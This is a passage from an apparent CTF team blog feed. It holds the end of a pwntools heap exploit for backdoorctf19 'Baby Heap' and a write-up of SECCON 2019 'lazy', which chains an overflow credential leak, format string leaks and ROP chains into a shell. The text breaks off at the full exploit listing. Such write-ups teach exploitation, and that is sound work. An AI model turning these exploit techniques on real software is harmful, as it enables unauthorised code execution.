class="string">"\n4) Exit\n&gt;&gt; "</span>,<span class="string">'3'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Enter the index:\n"</span>, str(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> r</span><br><span class="line">r = getConn()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Unsorted bin attack</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'A'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">'B'</span>*<span class="number">0x80</span>) <span class="comment"># Chunk to free</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>,<span class="string">'c'</span>*<span class="number">0x10</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x31</span>,<span class="string">'c'</span>*<span class="number">0x10</span>) <span class="comment"># CREATE A FAKE CHUNK HERE</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0x0</span>)+p16(<span class="number">0x67f8</span><span class="number">-0x10</span>)) <span class="comment"># 4 bit brute force</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x80</span>,<span class="string">'C'</span>) <span class="comment"># if we don't get an error here and global_max_fast will be modified to a very big number</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin dup</span></span><br><span class="line">free(<span class="number">0</span>) </span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">debug([<span class="number">0x400a5b</span>,<span class="number">0x400bcc</span>]) <span class="comment"># 0x400970</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6020f8</span>)) <span class="comment"># fake chunk</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">'C'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(elf.got[<span class="string">'atoi'</span>]))</span><br><span class="line">edit(<span class="number">0</span>, p64(elf.plt[<span class="string">'printf'</span>]))</span><br><span class="line"></span><br><span class="line">s = <span class="string">'%7$s    '</span></span><br><span class="line">s += p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">r.sendlineafter(<span class="string">"\n4) Exit\n&gt;&gt; "</span>,</span><br><span class="line">s)</span><br><span class="line">PUTS = u64(r.recv(<span class="number">0x6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">LIBC = PUTS-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">SYSTEM = LIBC+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span>%LIBC)</span><br><span class="line">log.info(<span class="string">"SYSTEM 0x%x"</span>%SYSTEM)</span><br><span class="line">r.sendlineafter(<span class="string">"\n4) Exit\n&gt;&gt; "</span>,<span class="string">"AA"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Enter the index:\n"</span>, <span class="string">''</span>)</span><br><span class="line">r.sendafter(<span class="string">"Please update the data:\n"</span>, p64(SYSTEM)) <span class="comment"># changes atoi for system</span></span><br><span class="line">r.send(<span class="string">'/bin/sh\x00'</span>) <span class="comment"># system("/bin/sh\x00")</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">log.failure(<span class="string">"not lucky enough!"</span>)</span><br><span class="line">r.close()</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"><span class="comment">#exploit()</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> exploit():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Baby Heap&lt;/p&gt;
&lt;p&gt;pwn backdoorctf19&lt;/p&gt;
&lt;p&gt;Just another babyheap challenge.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://backdoor.static.beast.sdsl
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="Unsorted Bin Attack" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Unsorted-Bin-Attack/"/>
    
      <category term="Fast Bin Dup" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Fast-Bin-Dup/"/>
    
    
      <category term="double_free" scheme="https://teamrocketist.github.io/tags/double-free/"/>
    
      <category term="backdoorctf2019" scheme="https://teamrocketist.github.io/tags/backdoorctf2019/"/>
    
      <category term="use_after_free" scheme="https://teamrocketist.github.io/tags/use-after-free/"/>
    
      <category term="fastbindup" scheme="https://teamrocketist.github.io/tags/fastbindup/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] SECCON 2019 - lazy</title>
    <link href="https://teamrocketist.github.io/2019/10/21/Pwn-SECCON-2019-lazy/"/>
    <id>https://teamrocketist.github.io/2019/10/21/Pwn-SECCON-2019-lazy/</id>
    <published>2019-10-21T18:43:44.000Z</published>
    <updated>2022-08-23T00:14:55.165Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>lazy</p><p>332</p><p>lazy.chal.seccon.jp 33333</p></blockquote><h3 id="1st-Stage"><a href="#1st-Stage" class="headerlink" title="1st Stage"></a>1st Stage</h3><p>No files have been provided in this challenge, let’s see what we can do it by connecting to the server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ nc lazy.chal.seccon.jp 33333</span><br><span class="line">1: Public contents</span><br><span class="line">2: Login</span><br><span class="line">3: Exit</span><br></pre></td></tr></table></figure><p>We are presented with 3 options, login is to provide a username and password which for now we don’t know yet, public contents provides us with a bunch of files and the source code of login_source.c file:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_LENGTH 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">"XXXXXXXXXX"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USERNAME <span class="meta-string">"XXXXXXXX"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">login</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> username[BUFFER_LENGTH];</span><br><span class="line"><span class="keyword">char</span> password[BUFFER_LENGTH];</span><br><span class="line"><span class="keyword">char</span> input_username[BUFFER_LENGTH];</span><br><span class="line"><span class="keyword">char</span> input_password[BUFFER_LENGTH];</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(username,<span class="number">0x0</span>,BUFFER_LENGTH);</span><br><span class="line"><span class="built_in">memset</span>(password,<span class="number">0x0</span>,BUFFER_LENGTH);</span><br><span class="line"><span class="built_in">memset</span>(input_username,<span class="number">0x0</span>,BUFFER_LENGTH);</span><br><span class="line"><span class="built_in">memset</span>(input_password,<span class="number">0x0</span>,BUFFER_LENGTH);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(username,USERNAME);</span><br><span class="line"><span class="built_in">strcpy</span>(password,PASSWORD);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"username : "</span>);</span><br><span class="line">input(input_username);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome, %s\n"</span>,input_username);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"password : "</span>);</span><br><span class="line">input(input_password);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strncmp</span>(username,input_username,<span class="built_in">strlen</span>(USERNAME)) != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid username"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strncmp</span>(password,input_password,<span class="built_in">strlen</span>(PASSWORD)) != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid password"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">(<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> recv;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                recv = (<span class="keyword">int</span>)read(STDIN_FILENO,&amp;buf[i],<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span>(recv == <span class="number">-1</span>)&#123;</span><br><span class="line">                        <span class="built_in">puts</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(buf[i] == <span class="string">'\n'</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                i++;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There’s an obvious buffer overflow vulnerability at <strong>input</strong> function, <strong>USERNAME</strong> and <strong>PASSWORD</strong> are defined with the <strong>#define</strong> macros and later copied into local variables in the stack:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(username,USERNAME);</span><br><span class="line"><span class="built_in">strcpy</span>(password,PASSWORD);</span><br></pre></td></tr></table></figure><p>Since we have no limits on the number of characters and <strong>input_username</strong> is located <strong>before</strong> in the stack we can leak both <strong>username</strong> and <strong>password</strong> if we fill until we reach that variable. </p><p>In this case we can <strong>leak</strong> the password by sending 32 characters(size of buffer), remember that to interrupt the input we need to send a newline in the end so we send <code>31* &#39;A&#39; + &#39;\n&#39;</code>.</p><p>Leaking the password:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ nc lazy.chal.seccon.jp 33333</span><br><span class="line">1: Public contents</span><br><span class="line">2: Login</span><br><span class="line">3: Exit</span><br><span class="line">2</span><br><span class="line">username : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">3XPL01717</span><br></pre></td></tr></table></figure><p>To leak the username we need to <code>&#39;A&#39;*(32+31)+&#39;\n&#39;</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'A'*(31+32)"</span></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">$ nc lazy.chal.seccon.jp 33333</span><br><span class="line">1: Public contents</span><br><span class="line">2: Login</span><br><span class="line">3: Exit</span><br><span class="line">2</span><br><span class="line">username : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">_H4CK3R_</span><br></pre></td></tr></table></figure><p>The username is <strong><em>H4CK3R</em></strong> and the password is <strong>3XPL01717</strong>.</p><h3 id="2nd-Stage"><a href="#2nd-Stage" class="headerlink" title="2nd Stage"></a>2nd Stage</h3><p>After logging in we are presented with another option:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nc lazy.chal.seccon.jp 33333</span><br><span class="line">1: Public contents</span><br><span class="line">2: Login</span><br><span class="line">3: Exit</span><br><span class="line">2</span><br><span class="line">username : _H4CK3R_</span><br><span class="line">Welcome, _H4CK3R_</span><br><span class="line"></span><br><span class="line">password : 3XPL01717</span><br><span class="line">Logged <span class="keyword">in</span>!</span><br><span class="line">1: Public contents</span><br><span class="line">2: Login</span><br><span class="line">3: Exit</span><br><span class="line">4: Manage</span><br><span class="line">4</span><br><span class="line">Welcome to private directory</span><br><span class="line">You can download contents <span class="keyword">in</span> this directory, but you can<span class="string">'t download contents with a dot in the name</span></span><br><span class="line"><span class="string">lazy</span></span><br><span class="line"><span class="string">libc.so.6</span></span><br><span class="line"><span class="string">Input file name</span></span><br></pre></td></tr></table></figure><p>We can now download the full executable but unfortunately we can’t download the <strong>libc.so.6</strong> which is probably a modified version, at this stage I downloaded lazy and started reverse engineering the binary:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">downloadLazy</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Input file name\n'</span>, <span class="string">'lazy'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Sending 14216 bytes'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'lazy'</span>, <span class="string">'w+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(r.recvall(timeout=<span class="number">2</span>))</span><br></pre></td></tr></table></figure><p>Opening it on IDA we find a format string vulnerability after inputting the file name:<br><a data-fancybox="gallery" href="https://i.imgur.com/QCcyFme.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/QCcyFme.png" alt><br></a><br>This can be combined with the buffer overflow vulnerability, we can <strong>leak</strong> addresses from the stack in this case we can leak the <strong>stack canary</strong> and a libc address from the <strong>GOT</strong> but we are missing the final piece of the puzzle we don’t know which libc version is to calculate the offsets.</p><p>Failed approaches to get the <strong>libc.so.6</strong> file:</p><ul><li><p>My first approach was to leak some libc addresses from the <strong>GOT</strong> and tried to use <a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc-database</a> but I failed the <strong>libc</strong> is probably a custom one modified by the author on purpose, so my only option was to find a way to download the <strong>libc.so.6</strong> from the server.</p></li><li><p>2nd approach was to modify the file name with format string perhaps there is a check in download function which limits the amount of characters of the <strong>filename</strong> making this very hard or almost impossible (at least I didn’t manage to do it this way).</p></li></ul><p>The one that worked was to create a <strong>ropchain</strong> that would open the file and jump right at the middle of the <strong>download</strong> function at the call <strong>fstat</strong> function and why at the middle ?<br><a data-fancybox="gallery" href="https://i.imgur.com/0yKqY0B.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/0yKqY0B.png" alt><br></a><br>The first three file descriptors are reserved for stdin (0x0), stdout(0x1) and stderr(0x2), so the next open we are going to use in <strong>ROP</strong> is going to be <strong>0x3</strong> this is important to know because we don’t have a <strong>gadget</strong> that can control move values from the register <strong>rax</strong> (open returns the <strong>fd</strong> to rax) but since we know exactly the <strong>fd</strong> number is we can just use a <strong>POP RDI gadget</strong> to move the number 0x3 there.</p><p>There are two useful <strong>ROP</strong> gadgets that can be used to execute open:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary lazy | grep <span class="string">'pop rdi'</span></span><br><span class="line">0x00000000004015f3 : pop rdi ; ret</span><br><span class="line">$ ROPgadget --binary lazy | grep <span class="string">'pop rsi'</span></span><br><span class="line">0x00000000004015f1 : pop rsi ; pop r15 ; ret</span><br></pre></td></tr></table></figure><p>With this we can control both 1st and 2nd args of a function so we can construct the execution of <strong>open</strong> like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ropchain = p64(POPRSIR15)</span><br><span class="line">ropchain += p64(<span class="number">0x0</span>)</span><br><span class="line">ropchain += p64(LIBC_SO_6)</span><br><span class="line">ropchain += p64(POPRDI)</span><br><span class="line">ropchain += p64(LIBC_SO_6)</span><br><span class="line">ropchain += p64(elf.plt[<span class="string">'open'</span>]) <span class="comment"># open("libc.so.6", 0)</span></span><br></pre></td></tr></table></figure><p>Note that <strong>LIBC_SO_6</strong> address can be taken from the binary by using IDA like this:<br><a data-fancybox="gallery" href="https://i.imgur.com/hfAVdN4.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/hfAVdN4.png" alt><br></a><br>Another thing that we need to consider we need to set <strong>RBP</strong> into a valid address, <strong>RBP is the base frame pointer which is used to calculate with offsets to the local variables of that function , the </strong>RBP** is fucked because we are jumping right at the middle of the function:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ropchain += p64(POPRBP)</span><br><span class="line">ropchain += p64(STACKADDR+<span class="number">0x90</span>+<span class="number">0x30</span>) <span class="comment"># RBP = STACKADDR+0xc0</span></span><br></pre></td></tr></table></figure><p><strong>STACKADDR</strong> is the address we leak from the stack with format string at the position 1, but why <strong>+0xc0</strong> ?<br><a data-fancybox="gallery" href="https://i.imgur.com/Ffimar9.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Ffimar9.png" alt><br></a><br>Another problem emerges, we also need to modify the local variable at <strong>RBP-0xdc</strong> to 0x3 otherwise <strong>read</strong> will read from a file descriptor at a value in that location in this case it will be 0x0 which is the <strong>stdin</strong><br><a data-fancybox="gallery" href="https://i.imgur.com/a8QOjjH.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/a8QOjjH.png" alt><br></a><br>But how can we modify a value at that location of the stack ? we can form a <strong>read</strong> ropchain but how do we do it if we don’t have any <strong>gadget</strong> to modify <strong>rdx</strong> ? well we can use <strong>atoi</strong> in the end of the executing it will set <strong>rdx</strong> to 0xa which is enough to use read to set the value <strong>0x3</strong> from the stdin.</p><p>Forming the ropchain:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ropchain += p64(POPRDI)</span><br><span class="line">ropchain += p64(<span class="number">0x401788</span>)</span><br><span class="line">ropchain += p64(elf.plt[<span class="string">'atoi'</span>]) <span class="comment"># atoi(0x401788) which will do RDX = 0xa</span></span><br><span class="line"></span><br><span class="line">ropchain += p64(POPRSIR15)</span><br><span class="line">ropchain += p64(STACKADDR+<span class="number">0xc0</span><span class="number">-0xdc</span>)</span><br><span class="line">ropchain += p64(<span class="number">0x3</span>)</span><br><span class="line">ropchain += p64(POPRDI)</span><br><span class="line">ropchain += p64(<span class="number">0x0</span>)</span><br><span class="line">ropchain += p64(elf.plt[<span class="string">'read'</span>]) <span class="comment"># read(0, STACKADDR+0xc0-0xdc, 0xa)</span></span><br></pre></td></tr></table></figure><p>Our python code to send this from the <strong>stdin</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.sendline(p64(<span class="number">0x03</span>)+<span class="string">'\x00'</span>)</span><br></pre></td></tr></table></figure><p>Remember this is necessary because since we are skipping running open at the <strong>download</strong> function we don’t also set <strong>RBP-0xdc</strong> to 0x3 which it should have been done here:<br><a data-fancybox="gallery" href="https://i.imgur.com/w3LkAmK.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/w3LkAmK.png" alt><br></a><br>And finally the last part which is to setup the parameters for <strong>fstat</strong> and jump to the middle of <strong>download</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ropchain += p64(POPRSIR15)</span><br><span class="line">ropchain += p64(STACKADDR)</span><br><span class="line">ropchain += p64(<span class="number">0x3</span>)    </span><br><span class="line">ropchain += p64(POPRDI)</span><br><span class="line">ropchain += p64(<span class="number">0x3</span>)</span><br><span class="line">ropchain += p64(<span class="number">0x400f4c</span>) <span class="comment"># fstat(fd=0x3, STACKADDR)</span></span><br></pre></td></tr></table></figure><p>After this we can successfully download but the file is somehow corrupted it came incomplete perhaps we can still get the offsets for the functions we need to create a final ropchain and get a shell:</p><p>The offset to <strong>system</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/72xpxIV.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/72xpxIV.png" alt><br></a><br>The offset to <strong>/bin/sh</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/CDlX5wI.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/CDlX5wI.png" alt><br></a><br>The offset to <strong>puts</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/NeNlo6c.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/NeNlo6c.png" alt><br></a><br>The functions that I used to leak addresses:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Leaks from the stack</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakFMTSi</span><span class="params">(i)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Input file name\n'</span>, <span class="string">'%&#123;&#125;$lx   '</span>.format(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leaks from an address</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakFMTSaddr</span><span class="params">(addr)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    s = <span class="string">'%7$s    '</span></span><br><span class="line">    s += p64(addr)</span><br><span class="line">    r.sendlineafter(<span class="string">'Input file name\n'</span>, s)</span><br></pre></td></tr></table></figure><p>Leaking the <strong>addresses</strong>, calculating offsets to <strong>libc</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">leakFMTSaddr(elf.got[<span class="string">'puts'</span>]) <span class="comment"># canary</span></span><br><span class="line">r.recv(<span class="number">0xb</span>)</span><br><span class="line">PUTS = u64(r.recv(<span class="number">0x6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">LIBC = PUTS<span class="number">-0x67880</span></span><br><span class="line">SYSTEM = LIBC+<span class="number">0x3f570</span></span><br><span class="line">BINSH = LIBC+<span class="number">0x163c38</span></span><br><span class="line">log.info(<span class="string">"PUTS 0x%x"</span>%PUTS)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span>%LIBC)</span><br><span class="line">log.info(<span class="string">"SYSTEM 0x%x"</span>%SYSTEM)</span><br><span class="line">log.info(<span class="string">"BINSH 0x%x"</span>%BINSH)</span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'OK! Downloading...\n'</span>)</span><br><span class="line">    </span><br><span class="line">leakFMTSi(<span class="number">9</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Filename : '</span>)</span><br><span class="line">CANARY = int(r.recv(<span class="number">0x10</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">"CANARY 0x%x"</span>%CANARY)</span><br><span class="line"></span><br><span class="line">leakFMTSi(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Filename : '</span>)</span><br><span class="line">STACKADDR = int(r.recv(<span class="number">0x10</span>),<span class="number">16</span>)</span><br><span class="line">STACKADDR += <span class="number">0x900</span> <span class="comment"># prevent a stupid printf error</span></span><br><span class="line">log.info(<span class="string">"STACKADDR 0x%x"</span>%STACKADDR)</span><br></pre></td></tr></table></figure><p>The final <strong>ropchain</strong> to get a shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    padding = <span class="string">'libc'</span>+<span class="string">'\x00'</span>*<span class="number">0x14</span></span><br><span class="line">    POPRDI = <span class="number">0x00000000004015f3</span></span><br><span class="line">    ropchain = p64(POPRDI)</span><br><span class="line">    ropchain += p64(BINSH)</span><br><span class="line">    ropchain += p64(SYSTEM)</span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    r.sendline(padding+p64(CANARY)+<span class="string">'A'</span>*<span class="number">8</span>+ropchain)</span><br></pre></td></tr></table></figure><p>The full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 